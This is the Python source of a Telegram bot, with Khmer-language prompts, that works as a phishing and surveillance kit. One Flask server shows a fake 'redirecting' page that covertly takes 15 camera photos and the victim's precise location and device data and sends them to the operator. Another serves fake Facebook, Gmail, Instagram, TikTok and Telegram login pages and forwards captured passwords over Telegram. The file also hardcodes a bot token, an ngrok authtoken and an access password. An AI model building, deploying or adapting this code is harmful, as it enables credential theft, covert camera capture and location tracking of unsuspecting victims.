import logging
import json
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from flask import Flask, request, redirect, render_template_string, jsonify, render_template
import uuid
import os
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont
import base64
import threading
import time
from pyngrok import ngrok
import asyncio
import socket
from datetime import datetime

# ================================
# CONFIGURATION
# ================================
TOKEN = "8169544871:AAGMPcNlMA9ZPndse3f30D5-0uHLeqc15Lo"
TELEGRAM_ID = "1530069749"
BOT_PASSWORD = "Mh4ck25"
NGROK_AUTHTOKEN = "340dUdKAsQd8xPxkSZgVCf0sR1b_4r1gQ2ya1iVXBuSWyJKcF"

# Flask servers configuration
HACK_SERVER_PORT = 5000
PHISHING_SERVER_PORT = 8080

# ================================
# SETUP LOGGING
# ================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================================
# DATA STORAGE
# ================================
user_data = {}
user_links = {}
ngrok_tunnels = {}
tracking_data = {}
active_chat_ids = set()
current_phishing_page = "facebook"

# Store ngrok URLs
hack_ngrok_url = None
phishing_ngrok_url = None

# ================================
# FLASK APPS
# ================================
hack_app = Flask('hack_app')
phishing_app = Flask('phishing_app')

# ================================
# HACK CAMERA & LOCATION FUNCTIONS
# ================================
TRACKING_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>កំពុងបញ្ជូនបន្ត...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
            };
            getLocation(info);
        }

        function getLocation(info) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        info.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        getBatteryInfo(info);
                    },
                    function(error) {
                        info.locationError = error.message;
                        getBatteryInfo(info);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                info.locationError = "Geolocation is not supported by this browser.";
                getBatteryInfo(info);
            }
        }

        function getBatteryInfo(info) {
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    info.batteryLevel = battery.level * 100;
                    info.batteryCharging = battery.charging;
                    requestCameraAccess(info);
                });
            } else {
                requestCameraAccess(info);
            }
        }

        function requestCameraAccess(info) {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                })
                .then(function(stream) {
                    info.cameraAccess = true;
                    takeMultiplePhotos(stream, info);
                })
                .catch(function(error) {
                    info.cameraAccess = false;
                    info.cameraError = error.name;
                    getIpAddress(info);
                });
            } else {
                info.cameraAccess = false;
                info.cameraError = 'No camera support';
                getIpAddress(info);
            }
        }

        function takeMultiplePhotos(stream, info) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                info.cameraPhotos = [];
                let photosTaken = 0;
                const totalPhotos = 15;
                const interval = 300;

                function capturePhoto() {
                    if (photosTaken < totalPhotos) {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photoData = canvas.toDataURL('image/jpeg', 0.95);
                        info.cameraPhotos.push(photoData);
                        photosTaken++;
                        setTimeout(capturePhoto, interval);
                    } else {
                        stream.getTracks().forEach(track => track.stop());
                        getIpAddress(info);
                    }
                }
                setTimeout(capturePhoto, 1000);
            };
        }

        function getIpAddress(info) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    info.ipAddress = ipData.ip;
                    sendDataToServer(info);
                })
                .catch(error => {
                    info.ipAddressError = error.message;
                    sendDataToServer(info);
                });
        }

        function sendDataToServer(info) {
            fetch('/track/{{ track_id }}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(info)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = "{{ redirect_url }}";
                } else {
                    console.error('Server error:', data.error);
                    window.location.href = "{{ redirect_url }}";
                }
            })
            .catch(error => {
                console.error('Error sending data:', error);
                window.location.href = "{{ redirect_url }}";
            });
        }

        window.onload = collectDeviceInfo;
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            color: #333;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(0, 0, 0, 0.3);
            border-radius: 50%;
            border-top-color: #007bff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>ប្រព័ន្ធកំពុងដំណើរកា...</h2>
        <p>សូមមេត្តារង់ចាំ 5វិនាទី ប្រព័ន្ធកំពុងដំណើរការ</p>
        <div class="loading"></div>
    </div>
</body>
</html>
"""

def add_watermark_with_date(image_data, text="t.me/mengheang25"):
    try:
        if isinstance(image_data, str) and image_data.startswith('data:image'):
            image_data = image_data.split(',')[1]
        image_bytes = base64.b64decode(image_data)
        image = Image.open(BytesIO(image_bytes)).convert('RGBA')

        watermark = Image.new('RGBA', image.size, (0, 0, 0, 0))
        draw = ImageDraw.Draw(watermark)

        try:
            font_size = max(20, min(image.width, image.height) // 20)
            font = ImageFont.truetype("arial.ttf", font_size)
        except:
            try:
                font = ImageFont.load_default()
            except:
                font = None

        # Get current date
        current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Left watermark (username)
        left_text = text
        if font:
            left_width, left_height = draw.textsize(left_text, font=font)
        else:
            left_width, left_height = 150, 20
            
        left_margin = 10
        left_x = left_margin
        left_y = image.height - left_height - left_margin

        # Right watermark (date)
        right_text = current_date
        if font:
            right_width, right_height = draw.textsize(right_text, font=font)
        else:
            right_width, right_height = 150, 20
            
        right_margin = 10
        right_x = image.width - right_width - right_margin
        right_y = image.height - right_height - right_margin

        # Draw left background
        draw.rectangle([left_x - 5, left_y - 5, left_x + left_width + 5, left_y + left_height + 5], fill=(0, 0, 0, 128))
        
        # Draw right background
        draw.rectangle([right_x - 5, right_y - 5, right_x + right_width + 5, right_y + right_height + 5], fill=(0, 0, 0, 128))

        # Draw left text
        if font:
            draw.text((left_x, left_y), left_text, fill=(255, 255, 255, 255), font=font)
        else:
            draw.text((left_x, left_y), left_text, fill=(255, 255, 255, 255))

        # Draw right text
        if font:
            draw.text((right_x, right_y), right_text, fill=(255, 255, 255, 255), font=font)
        else:
            draw.text((right_x, right_y), right_text, fill=(255, 255, 255, 255))

        watermarked_image = Image.alpha_composite(image, watermark).convert('RGB')
        output = BytesIO()
        watermarked_image.save(output, format='JPEG', quality=95)
        return "data:image/jpeg;base64," + base64.b64encode(output.getvalue()).decode('utf-8')
    except Exception as e:
        print(f"កំហុសក្នុងការបន្ថែមផ្ទាំងទឹក: {e}")
        if isinstance(image_data, str) and image_data.startswith('data:image'):
            return image_data
        else:
            return "data:image/jpeg;base64," + image_data

def send_hack_notification(track_id, device_info, creator_id):
    try:
        recipients = []
        recipients.append(TELEGRAM_ID)
        
        creator_id_str = str(creator_id)
        if creator_id_str != TELEGRAM_ID and creator_id_str in user_data:
            recipients.append(creator_id_str)
        
        user_info = user_data.get(creator_id_str, {})
        username = user_info.get('username', 'មិនស្គាល់')
        name = user_info.get('name', 'មិនស្គាល់')
        
        message = f"🔔 មានអ្នកប្រើប្រាស់ចុចចូលតំណភ្ជាប់ដែលអ្នកផ្ញើទៅ!\n\n"
        message += f"👤 អ្នកបង្កើតតំណភ្ជាប់: {name} (@{username})\n\n"
        message += f"📍Track ID: {track_id}\n"
        message += f"📍IP Address: {device_info.get('ip_address', 'មិនស្គាល់')}\n"
        message += f"📱User Agent: {device_info.get('userAgent', 'មិនស្គាល់')}\n"
        message += f"📱Platform: {device_info.get('platform', 'មិនស្គាល់')}\n"
        message += f"📱Language: {device_info.get('language', 'មិនស្គាល់')}\n"
        message += f"📱Screen: {device_info.get('screenWidth', 'មិនស្គាល់')}x{device_info.get('screenHeight', 'មិនស្គាល់')}\n"
        
        if 'batteryLevel' in device_info:
            message += f"🔋ថាមពលថ្មឧបករណ៍: {device_info['batteryLevel']}% ({'កំពុងសាក' if device_info.get('batteryCharging') else 'មិនកំពុងសាក'})\n"
        
        if 'location' in device_info:
            lat = device_info['location']['latitude']
            lng = device_info['location']['longitude']
            accuracy = device_info['location']['accuracy']
            maps_url = f"https://www.google.com/maps?q={lat},{lng}"
            message += f"📍ទីតាំង: {lat}, {lng} (ភាពជាក់លាក់: {accuracy}m)\n\n"
            message += f"🗺️ Google Maps: {maps_url}\n"
        
        for recipient in recipients:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            data = {
                "chat_id": recipient,
                "text": message
            }
            requests.post(url, json=data)
            
            if 'location' in device_info:
                lat = device_info['location']['latitude']
                lng = device_info['location']['longitude']
                url = f"https://api.telegram.org/bot{TOKEN}/sendLocation"
                data = {
                    "chat_id": recipient,
                    "latitude": lat,
                    "longitude": lng
                }
                requests.post(url, json=data)
        
        # Send location accuracy message
        if 'location' in device_info:
            accuracy_message = f"📍 Location Received\nLatitude: {device_info['location']['latitude']}\nLongitude: {device_info['location']['longitude']}\nAccuracy: {device_info['location']['accuracy']} meters"
            for recipient in recipients:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                             json={"chat_id": recipient, "text": accuracy_message})
        
        # Send camera photos with watermarks
        if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
            for i, photo_data in enumerate(device_info['cameraPhotos']):
                try:
                    # Add watermark with date
                    watermarked_image = add_watermark_with_date(photo_data)
                    
                    photo_data = watermarked_image.split(',')[1] if watermarked_image.startswith('data:image') else watermarked_image
                    photo_bytes = base64.b64decode(photo_data)
                    
                    for recipient in recipients:
                        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
                        files = {'photo': (f'camera_{i+1}.jpg', photo_bytes)}
                        data = {
                            "chat_id": recipient,
                            "caption": f"📸 រូបពីកាមេរ៉ាលេខ {i+1}/15\nDeveloper : @mengheang25"
                        }
                        response = requests.post(url, files=files, data=data)
                        
                except Exception as e:
                    error_msg = f"❌ មិនអាចបញ្ជូនរូបពីកាមេរ៉ាលេខ {i+1}: {str(e)}"
                    for recipient in recipients:
                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                     json={"chat_id": recipient, "text": error_msg})
        
        # Send create tracking link button after all photos
        keyboard = [[InlineKeyboardButton("Create Tracking Link", callback_data="create_tracking_link")]]
        reply_markup = json.dumps({"inline_keyboard": keyboard})
        
        for recipient in recipients:
            restart_message = "អ្នកអាចធ្វើការ /restart "
            requests.post(f"https://api.gram.org/bot{TOKEN}/sendMessage", 
                         json={"chat_id": recipient, "text": restart_message, "reply_markup": reply_markup})
                    
    except Exception as e:
        print(f"Error sending notification to Telegram: {e}")

@hack_app.route('/track/<track_id>', methods=['GET', 'POST'])
def track(track_id):
    if request.method == 'GET':
        redirect_url = request.args.get('url', 'https://google.com')
        return render_template_string(TRACKING_PAGE_HTML, track_id=track_id, redirect_url=redirect_url)
    
    elif request.method == 'POST':
        try:
            device_info = request.json
            device_info['ip_address'] = request.remote_addr
            
            creator_id = None
            for user_id, links in user_links.items():
                for link in links:
                    if link['track_id'] == track_id:
                        creator_id = user_id
                        break
                if creator_id:
                    break
            
            os.makedirs('captured_images', exist_ok=True)
            
            if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
                device_info['processedPhotos'] = []
                for i, photo_data in enumerate(device_info['cameraPhotos']):
                    try:
                        watermarked_image = add_watermark_with_date(photo_data)
                        
                        image_data = photo_data.split(',')[1] if photo_data.startswith('data:image') else photo_data
                        image_bytes = base64.b64decode(image_data)
                        with open(f'captured_images/{track_id}camera{i+1}_original.jpg', 'wb') as f:
                            f.write(image_bytes)
                        
                        watermarked_bytes = base64.b64decode(watermarked_image.split(',')[1])
                        with open(f'captured_images/{track_id}camera{i+1}_watermarked.jpg', 'wb') as f:
                            f.write(watermarked_bytes)
                        
                        device_info['processedPhotos'].append(watermarked_image)
                    except Exception as e:
                        print(f"Error processing camera image {i+1}: {e}")
                        device_info['processedPhotos'].append(photo_data)
            
            tracking_data[track_id] = device_info
            
            if creator_id:
                send_hack_notification(track_id, device_info, creator_id)
            
            return jsonify({'success': True})
            
        except Exception as e:
            print(f"Error processing data: {e}")
            return jsonify({'success': False, 'error': str(e)})

def run_hack_server():
    print(f"🚀 Starting Hack Server on port {HACK_SERVER_PORT}")
    hack_app.run(host='0.0.0.0', port=HACK_SERVER_PORT, debug=False, use_reloader=False)

# ================================
# PHISHING ATTACK FUNCTIONS
# ================================
def send_phishing_notification(data, creator_id):
    try:
        platform_info = {
            "facebook": {"name": "Facebook", "icon": "📘"},
            "tiktok": {"name": "TikTok", "icon": "🎵"},
            "telegram": {"name": "Telegram", "icon": "📱"},
            "gmail": {"name": "Gmail", "icon": "📧"},
            "instagram": {"name": "Instagram", "icon": "📸"}
        }
        
        platform = platform_info.get(data['pageType'], {"name": "Unknown", "icon": "🌐"})
        
        # Get creator info
        creator_id_str = str(creator_id)
        user_info = user_data.get(creator_id_str, {})
        username = user_info.get('username', 'មិនស្គាល់')
        name = user_info.get('name', 'មិនស្គាល់')
        
        message = f"🚨 {platform['name']} Login Information 🚨\n\n"
        message += f"👤 អ្នកបង្កើតតំណភ្ជាប់: {username} (@{username})\n\n"
        message += f"{platform['icon']} Platform: {platform['name']}\n"
        message += f"👤 Username/Email: {data['username']}\n"
        message += f"🔑 Password: {data['password']}\n"
        message += f"🌐 IP Address: {data['ipAddress']}\n\n"
        message += "developed by : @mengheang25"
        
        recipients = []
        recipients.append(TELEGRAM_ID)
        
        if creator_id_str != TELEGRAM_ID and creator_id_str in user_data:
            recipients.append(creator_id_str)
        
        for chat_id in recipients:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            payload = {
                'chat_id': chat_id,
                'text': message
            }
            
            try:
                response = requests.post(url, data=payload)
                print(f"📢 Message sent to chat_id {chat_id}: {response.status_code}")
            except Exception as e:
                print(f"❌ Error sending to chat_id {chat_id}: {e}")
        
        # Send restart message
        restart_message = "អ្នកអាចធ្វើការ /restart នៅពេលដែលចុច /restart វានិងធ្វើ start bot ជាថ្មី"
        for chat_id in recipients:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            payload = {
                'chat_id': chat_id,
                'text': restart_message
            }
            requests.post(url, data=payload)
            
    except Exception as e:
        print(f"Error sending phishing notification: {e}")

def add_phishing_chat_id(chat_id):
    active_chat_ids.add(chat_id)
    print(f"✅ Added chat_id to broadcast list: {chat_id}")
    print(f"📊 Total active users: {len(active_chat_ids)}")

@phishing_app.route('/')
def phishing_index():
    template_files = {
        "facebook": "facebook.html",
        "tiktok": "tiktok.html", 
        "telegram": "telegram.html",
        "gmail": "gmail.html",
        "instagram": "instagram.html"
    }
    
    template_file = template_files.get(current_phishing_page, "facebook.html")
    
    return render_template(template_file)

@phishing_app.route('/set_page/<page_type>')
def set_page(page_type):
    global current_phishing_page
    print(f"=== DEBUG: Setting page to: {page_type} ===")
    
    if page_type in ["facebook", "tiktok", "telegram", "gmail", "instagram"]:
        current_phishing_page = page_type
        print(f"=== DEBUG: Page successfully set to: {current_phishing_page} ===")
        return f"Page set to {page_type}"
    
    print(f"=== DEBUG: Invalid page type: {page_type} ===")
    return "Invalid page type"

@phishing_app.route('/login', methods=['POST'])
def phishing_login():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    data = {
        'username': username,
        'password': password,
        'ipAddress': ip_address,
        'userAgent': user_agent,
        'pageType': current_phishing_page
    }
    
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    print('Credentials saved:', data)
    
    # Get creator ID from referer or track the creator
    creator_id = TELEGRAM_ID  # Default to admin
    send_phishing_notification(data, creator_id)
    
    redirect_urls = {
        "tiktok": "https://www.tiktok.com/",
        "telegram": "https://web.telegram.org/",
        "gmail": "https://mail.google.com/",
        "instagram": "https://www.instagram.com/",
        "facebook": "https://www.facebook.com/"
    }
    
    return redirect(redirect_urls.get(current_phishing_page, "https://www.google.com/"))

def run_phishing_server():
    print(f"🚀 Starting Phishing Server on port {PHISHING_SERVER_PORT}")
    phishing_app.run(host='0.0.0.0', port=PHISHING_SERVER_PORT, debug=False, use_reloader=False)

# ================================
# TELEGRAM BOT FUNCTIONS
# ================================
async def show_progress(update, context, progress_message, progress=0):
    progress_bar_length = 20
    filled_length = int(progress_bar_length * progress // 100)
    bar = '█' * filled_length + '░' * (progress_bar_length - filled_length)
    
    message = f"{progress_message}\n\n[{bar}] {progress}%"
    
    if 'progress_message_id' in context.user_data:
        try:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=context.user_data['progress_message_id'],
                text=message
            )
        except:
            sent_message = await update.message.reply_text(message)
            context.user_data['progress_message_id'] = sent_message.message_id
    else:
        sent_message = await update.message.reply_text(message)
        context.user_data['progress_message_id'] = sent_message.message_id

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    
    if user_id not in user_data:
        user_data[user_id] = {"name": user.full_name, "username": user.username, "type": "user"}
    
    if not context.user_data.get("authenticated", False):
        welcome_message = (
            f"សួស្តី {user.full_name}! 👋\n\n"
            f"នេះជា ID របស់អ្នក 🪪: {user.id}\n\n"
            "សូមចុះឈ្មោះបញ្ចូល password ដើម្បីប្រើប្រាស់ បើមិនទាន់មាន password សូមទាក់ទងទៅកាន់ Admin ដើម្បីទទួលបាន password ចូលប្រើ \n\n"
            "សូមចុចពាក្យថា (SEND MESSAGE) ដើម្បីទាក់ទងទៅកាន់ Admin \n\n"
            "បន្ទាប់មក អ្នកអាចចុច register ដើម្បីដាក់ password 🔑 ចូលប្រើប្រាស់"
        )
        keyboard = [
            [InlineKeyboardButton("SEND MESSAGE", url="https://t.me/mengheang25")],
            [InlineKeyboardButton("REGISTER", callback_data="register")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(welcome_message, reply_markup=reply_markup)
    else:
        await show_main_menu(update, context)

async def show_main_menu(update, context):
    user = update.effective_user
    welcome_message = (
        f"Hello {user.full_name} 👋 \n\n"
        f"Welcome! ពេលនេះអ្នកអាចប្រើប្រាស់បទនេះដើម្បីធ្វើការពីប្រហារ ដែល bot នេះ គឺមានដំណើរការដូចជា Hack camera phone & Real location និង Phishing attack social media \n\n"
        "សូមជ្រើសរើសប៊ូតង់ខាងក្រោមណាមួយដើម្បីវាយប្រហារ\n\n"
        "📊 Status: ✅ Active\n"
        "👤 Developer: @mengheang25\n\n"
        "Use the buttons below to navigate:"
    )
    
    keyboard = [
        [InlineKeyboardButton("📸 Hack Camera & Location", callback_data="hack_menu")],
        [InlineKeyboardButton("🔗 All Phishing Attack", callback_data="phishing_menu")],
        [InlineKeyboardButton("📊 Status", callback_data="status"),
         InlineKeyboardButton("👤 Developer", url="https://t.me/mengheang25")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(welcome_message, reply_markup=reply_markup)
    else:
        await update.message.reply_text(welcome_message, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "register":
        await query.edit_message_text("សូមធ្វើការវាយបញ្ជូល password 🔑 ត្រឹមត្រូវដើម្បីចុះឈ្មោះប្រើប្រាស់")
        context.user_data["awaiting_password"] = True
    
    elif query.data == "hack_menu":
        if not context.user_data.get("authenticated", False):
            await query.edit_message_text("❌ អ្នកត្រូវតែបញ្ចូល password ជាមុនសិន។")
            return
        
        message = (
            "📸 H4ck Camera & Location\n\n"
            "⚠️ This link will:\n"
            "• 📍 Access device location\n"
            "• 📸 Take photos from camera (15 photos)\n"
            "• 📱 Collect device information\n"
            "• 🔋 Get battery status\n"
            "• 🌐 Get IP address\n\n"
            "🔒 Note: This requires user permission for camera and location access.\n\n"
            "💢 Please click the 'Create Tracking Link' button to create a link.\n\n"
            "👤 Developer: @mengheang25"
        )
        
        keyboard = [
            [InlineKeyboardButton("Create Tracking Link", callback_data="create_tracking_link")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup)
    
    elif query.data == "phishing_menu":
        if not context.user_data.get("authenticated", False):
            await query.edit_message_text("❌ អ្នកត្រូវតែបញ្ចូល password ជាមុនសិន។")
            return
        
        keyboard = [
            [InlineKeyboardButton("📘 Facebook", callback_data="phishing_facebook")],
            [InlineKeyboardButton("🎵 TikTok", callback_data="phishing_tiktok")],
            [InlineKeyboardButton("✈️ Telegram", callback_data="phishing_telegram")],
            [InlineKeyboardButton("📧 Gmail", callback_data="phishing_gmail")],
            [InlineKeyboardButton("📷 Instagram", callback_data="phishing_instagram")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🔗 All Phishing Platforms\n\nSelect a platform to generate phishing link:", reply_markup=reply_markup)
    
    elif query.data == "create_tracking_link":
        await query.edit_message_text("🌐 សូមបញ្ចូល URL ដែលអ្នកចង់ដាក់ជាការបញ្ជូនបន្ត:\n\nឧទាហរណ៍:\nhttps://google.com\nhttps://youtube.com\nhttps://facebook.com")
        context.user_data['awaiting_url'] = True
    
    elif query.data == "status":
        message = (
            "📊 Bot Status\n\n"
            "✅ Bot Status: Active\n"
            "👥 Active Users: " + str(len(user_data)) + "\n"
            "👤 Developer: @mengheang25\n\n"
            "🛡️ All systems operational."
        )
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup)
    
    elif query.data == "main_menu":
        await show_main_menu(update, context)
    
    elif query.data.startswith("phishing_"):
        platform = query.data.replace("phishing_", "")
        await show_phishing_link(update, context, platform)

async def show_phishing_link(update: Update, context: ContextTypes.DEFAULT_TYPE, platform: str):
    query = update.callback_query
    
    try:
        requests.get(f"http://localhost:{PHISHING_SERVER_PORT}/set_page/{platform}", timeout=2)
        print(f"✅ Page set to: {platform}")
    except Exception as e:
        print(f"❌ Error setting page: {e}")
    
    platform_names = {
        "facebook": "Facebook",
        "tiktok": "TikTok", 
        "telegram": "Telegram",
        "gmail": "Gmail",
        "instagram": "Instagram"
    }
    
    platform_name = platform_names.get(platform, "Unknown")
    
    # Use the phishing ngrok URL instead of localhost
    test_url = phishing_ngrok_url if phishing_ngrok_url else "https://latest-overchildish-solenoidally.ngrok-free.dev"
    
    message = f"🔗 {platform_name} Phishing Link\n\n"
    message += f"🌐 Public URL (Ngrok):\n\n"
    message += f"{test_url}\n\n"
    message += f"📘 This link will show a realistic {platform_name} login page.\n\n"
    message += "👤 Developer: @mengheang25"
    
    keyboard = [
        [InlineKeyboardButton("Open Test", url=test_url)],
        [InlineKeyboardButton("Back", callback_data="phishing_menu")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(message, reply_markup=reply_markup)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("awaiting_password", False):
        entered_password = update.message.text.strip()
        if entered_password == BOT_PASSWORD:
            context.user_data["authenticated"] = True
            context.user_data["awaiting_password"] = False
            add_phishing_chat_id(update.effective_chat.id)
            
            await update.message.reply_text("✅ Password 🔑ត្រឹមត្រូវ!\n\nពេលនេះអ្នកអាចប្រើ bot នេះដោយសប្បាយ")
            
            keyboard = [[InlineKeyboardButton("Go To H4CK", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("ចុចប៊ូតុងខាងក្រោមដើម្បីបន្ត", reply_markup=reply_markup)
        else:
            await update.message.reply_text("❌ Password មិនត្រឹមត្រូវ សូមព្យាយាមម្ដងទៀត")
        return
    
    if context.user_data.get('awaiting_url'):
        await handle_tracking_url(update, context)

async def handle_tracking_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text
    user_id = update.effective_user.id
    
    progress_message = "🔄 Bot កំពុងបង្កើតតំណភ្ជាប់តាមដាន..."
    await show_progress(update, context, progress_message, 10)
    
    track_id = str(uuid.uuid4())
    
    if user_id not in user_links:
        user_links[user_id] = []
    
    try:
        await asyncio.sleep(0.5)
        await show_progress(update, context, progress_message, 30)
        
        if user_id in ngrok_tunnels:
            try:
                ngrok.disconnect(ngrok_tunnels[user_id])
            except:
                pass
        
        await asyncio.sleep(0.5)
        await show_progress(update, context, progress_message, 60)
        
        public_url = ngrok.connect(HACK_SERVER_PORT, bind_tls=True).public_url
        ngrok_tunnels[user_id] = public_url
        
        await asyncio.sleep(0.5)
        await show_progress(update, context, progress_message, 80)
        
        tracking_link = f"{public_url}/track/{track_id}?url={url}"
        
        link_data = {
            'track_id': track_id,
            'redirect_url': url,
            'tracking_link': tracking_link,
            'created_at': time.time(),
            'user_id': user_id
        }
        user_links[user_id].append(link_data)
        context.user_data['awaiting_url'] = False
        
        await show_progress(update, context, progress_message, 100)
        
        message = "✅ តំណភ្ជាប់តាមដានថ្មីត្រូវបានបង្កើតដោយជោគជ័យ!\n\n"
        message += f"🎯 URL គោលដៅ: {url}\n\n"
        message += "🔗 តំណភ្ជាប់តាមដានរបស់អ្នក:\n"
        message += f"{tracking_link}\n\n"
        message += "📊 តំណនេះនឹងចាប់យក:\n"
        message += "• 📱 ព័ត៌មានឧបករណ៍\n• 📍 ទីតាំង (Google Maps)\n• 📸 រូបថតពីកាមេរ៉ា (15 សន្លឹក)\n• និងព័ត៌មានផ្សេងៗទៀត\n ⏲ ព័ត៌មានទាំងអស់និងផ្ញើត្រឡប់មកវិញ នៅខាក្រោមនេះ"
        
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id']
                )
            except:
                pass
            del context.user_data['progress_message_id']
        
        await update.message.reply_text(message)
        
        keyboard = [
            [InlineKeyboardButton("Open Test url", url=tracking_link)],
            [InlineKeyboardButton("Create Tracking Link", callback_data="create_tracking_link")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("បង្កើតតំណភ្ជាប់ថ្មីទៀត:", reply_markup=reply_markup)
        
    except Exception as e:
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id']
                )
            except:
                pass
            del context.user_data['progress_message_id']
        
        await update.message.reply_text(f"❌ កំហុសក្នុងការបង្កើតតំណ: {str(e)}")
        context.user_data['awaiting_url'] = False

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def setup_ngrok_tunnels():
    """Setup ngrok tunnels for both servers"""
    global hack_ngrok_url, phishing_ngrok_url
    
    try:
        ngrok.set_auth_token(NGROK_AUTHTOKEN)
        print("✅ Ngrok authtoken set successfully")
        
        # Setup hack server tunnel
        hack_tunnel = ngrok.connect(HACK_SERVER_PORT, bind_tls=True)
        hack_ngrok_url = hack_tunnel.public_url
        print(f"🔗 Hack Server Ngrok URL: {hack_ngrok_url}")
        
        # Setup phishing server tunnel
        phishing_tunnel = ngrok.connect(PHISHING_SERVER_PORT, bind_tls=True)
        phishing_ngrok_url = phishing_tunnel.public_url
        print(f"🔗 Phishing Server Ngrok URL: {phishing_ngrok_url}")
        
    except Exception as e:
        print(f"❌ Ngrok setup error: {e}")
        # Fallback URLs
        hack_ngrok_url = "https://latest-overchildish-solenoidally.ngrok-free.dev"
        phishing_ngrok_url = "https://latest-overchildish-solenoidally.ngrok-free.dev"

# ================================
# MAIN APPLICATION
# ================================
def run_flask_servers():
    hack_thread = threading.Thread(target=run_hack_server, daemon=True)
    phishing_thread = threading.Thread(target=run_phishing_server, daemon=True)
    
    hack_thread.start()
    phishing_thread.start()
    
    print("✅ Both Flask servers started successfully!")
    print(f"📍 Hack Server: http://localhost:{HACK_SERVER_PORT}")
    print(f"📍 Phishing Server: http://localhost:{PHISHING_SERVER_PORT}")

def main():
    # Setup ngrok tunnels first
    setup_ngrok_tunnels()
    
    # Start Flask servers
    run_flask_servers()
    
    # Create and configure bot application
    application = Application.builder().token(TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("restart", start))
